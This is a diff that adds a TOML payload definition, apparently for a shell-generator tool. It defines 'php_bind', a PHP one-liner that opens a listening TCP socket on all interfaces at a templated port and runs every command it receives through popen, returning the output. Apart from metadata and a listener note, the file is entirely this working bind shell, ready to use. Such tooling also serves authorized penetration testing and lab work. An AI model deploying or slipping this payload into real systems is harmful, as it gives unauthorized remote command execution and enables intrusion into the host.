@@ -1,0 +1,12 @@
+id = "php_bind"
+name = "PHP Bind"
+os = "all"
+type = "bind"
+proto = "tcp"
+lang = "php"
+description = "PHP bind shell using socket_create, socket_bind, and socket_listen."
+
+payload = "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{{LPORT}});\\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'"
+
+[listeners]
+none = "This is a bind shell, you rather connect to the target."
